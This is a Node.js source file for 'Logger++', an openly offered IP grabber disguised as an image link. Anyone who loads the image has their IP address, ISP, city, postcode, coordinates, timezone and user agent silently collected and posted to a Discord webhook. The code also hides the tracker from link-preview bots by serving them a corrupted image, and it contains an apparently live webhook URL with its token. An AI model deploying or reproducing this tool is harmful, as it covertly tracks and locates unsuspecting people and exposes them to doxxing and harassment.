//       __                                            //
//      / /  ___   __ _  __ _  ___ _ __  _     _       //
//     / /  / _ \ / _` |/ _` |/ _ \ '__|| |_ _| |_     //
//    / /__| (_) | (_| | (_| |  __/ | |_   _|_   _|    //
//    \____/\___/ \__, |\__, |\___|_|   |_|   |_|      //
//                |___/ |___/                          //
//                                                     //
//       A Powerful Node.JS Discord Logger Tool.       //
//        Made By: https://github.com/Cartxrr          //
//         THIS REQUIRES NODEJS AND EXPRESS            // 
//         ⚠ OPTIONS ARE IN CONFIG.JSON! ⚠            //
//                                                     //
                                                    // ^ ocd 😭
                                                    
// ⚠ DONT EDIT PAST THIS POINT IF YOU DONT KNOW WHAT YOU ARE DOING!! ⚠
const app = require("express")();
const https = require("https");
const config = require("./config.json");
// Requirements ^

// My Crappy Request Function
function request(options, data, callback) {
  const req = https.request(options, function (res) {
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });
    res.on("end", () => {
      callback(responseData); // this crashes alot so uh if you can fix it please do 🙏
    });
  });

  if (data !== null && data) req.write(JSON.stringify(data));
  req.end();
}

// This Just Checks if the IP given is a Bot
function checkifbot(ip) {
  if (
    (ip && ip.startsWith("35.")) ||
    ip.startsWith("34.") ||
    ip.startsWith("104.") ||
    ip.startsWith("143.") ||
    ip.startsWith("27.") ||
    ip.startsWith("164.") ||
    ip.startsWith("64.") // REMOVE IF YOU THINK THIS MIGHT SCREW YOU UP. (THIS IS VERCELS PREVIEW BOT IP)
  )
    return true;
  else return false;
}

// THANK YOU DEKRYPTED FOR THIS
const glitchedimgdata =
  "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\x00C\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc2\x00\x11\x08\x01\xe0\x01\xe0\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

app.get("/*", (req, res) => {
  if (config.webhookurl == "https://discord.com/api/webhooks/1206128562269331467/tCRzaViYmQ4IW6kmg6Ffq4hnhVDV6XairSVmMKJDxBQVWyCRHhVgwJr2Y4vAnWziSHeI") { res.status(500).send("PLEASE SET A WEBHOOK"); return; }
  if (config.imageurl == null) { res.status(500).send("PLEASE SET A IMAGE"); return; }

  let ip = req.headers["x-forwarded-for"];
  if (checkifbot(ip) == true) {
    if (config.corruptedimage == true) {
      res.setHeader("Content-Type", "image/png");
      res.send(Buffer.from(glitchedimgdata, "binary")); // use dekryped's sexy image data on bots so it like embeds corrupted and stuff
    }
    return;
  }
  request(
    { hostname: "ipwho.is", path: `/${ip}`, method: "GET" }, // if you wanna change this go ahead just the other ones were rate limiting me because of vercel
    null, // yuh
    (data15) => {
      data15 = JSON.parse(data15);

      // good luck reading this shit
      let data = {
        content: "@everyone", // @everyone fuck you
        embeds: [
          {
            description: `
**🌐 IP:** \`${ip ? ip : "N/A"}\`
**🧠 Internet Provider:** \`${
              data15["connection"]["isp"] ? data15["connection"]["isp"] : "N/A"
            }\`
**🏁 Country:** \`${data15["country"] ? data15["country"] : "N/A"}/${
              data15["country_code"] ? data15["country_code"] : "N/A"
            }\`
**🏴 Region:** \`${data15["region"] ? data15["region"] : "N/A"}/${
              req.headers["x-vercel-ip-country-region"]
                ? req.headers["x-vercel-ip-country-region"]
                : data15["region_code"]
                ? data15["region_code"]
                : "N/A"
            }\`
**🏙 City:** \`${
              data15["city"]
                ? data15["city"]
                : req.headers["x-vercel-ip-city"]
                ? req.headers["x-vercel-ip-city"]
                : "N/A"
            }\`
**🤐 ZipCode:** \`${data15["postal"] ? data15["postal"] : "N/A"}\`
**📌 Coordinates:** \`${
              req.headers["x-vercel-ip-latitude"]
                ? req.headers["x-vercel-ip-latitude"]
                : data15["latitude"]
                ? data15["latitude"]
                : "N/A"
            }, ${
              req.headers["x-vercel-ip-longitude"]
                ? req.headers["x-vercel-ip-longitude"]
                : data15["longitude"]
                ? data15["longitude"]
                : "N/A"
            }\`
**⌛ Timezone:** \`${
              req.headers["x-vercel-ip-timezone"]
                ? req.headers["x-vercel-ip-timezone"]
                : data15["timezone"]["id"]
                ? data15["timezone"]["id"]
                : "N/A"
            }/${
              data15["timezone"]["abbr"] ? data15["timezone"]["abbr"] : "N/A"
            }\` 
**💻 User Agent:** \`${
              req.headers["user-agent"] ? req.headers["user-agent"] : "N/A"
            }\``,

            footer: {
              text: " @Cartxrr | Logger++ ", // just some credits to my self 💪
              icon_url: "https://avatars.githubusercontent.com/u/116686230?v=4", // my github pfp ofc 🙄
            },
          },
        ],
      };

      // Makes a sexy request to mr discord
      request(
        {
          hostname: "discord.com",
          path: config.webhookurl.replace("https://discord.com/api/webhooks/1206128562269331467/tCRzaViYmQ4IW6kmg6Ffq4hnhVDV6XairSVmMKJDxBQVWyCRHhVgwJr2Y4vAnWziSHeI", ""),
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(JSON.stringify(data)),
          },
        },
        data,
        () => {
          if (config.imageurl !== "https://media.discordapp.net/attachments/1206128546892746762/1206130139482558514/OIP.jpg?ex=65dae33a&is=65c86e3a&hm=c45322b2fec84411f889710bfb04f728cd56ccd377bb7cd106fbbd9227b28dda&=&format=webp&width=496&height=331") {
            https.get(config.imageurl, (response) => {
              if (response.statusCode === 200) {
                res.setHeader("Content-Type", "image/png");
                response.pipe(res); // chatgpt helped me wit this >-< (im stupid)
              } else
                res
                  .status(500)
                  .send(config.imageurl + " Couldnt Be Downloaded"); // womp womp
            });
          }
        }
      );
    }
  );
});
app.listen(3000); // rAhhhhh LISTEN ON PORT 3000 BECAYSE 3000 IS SUPERIOR

// Thank god prettier exists or else this would look like hell
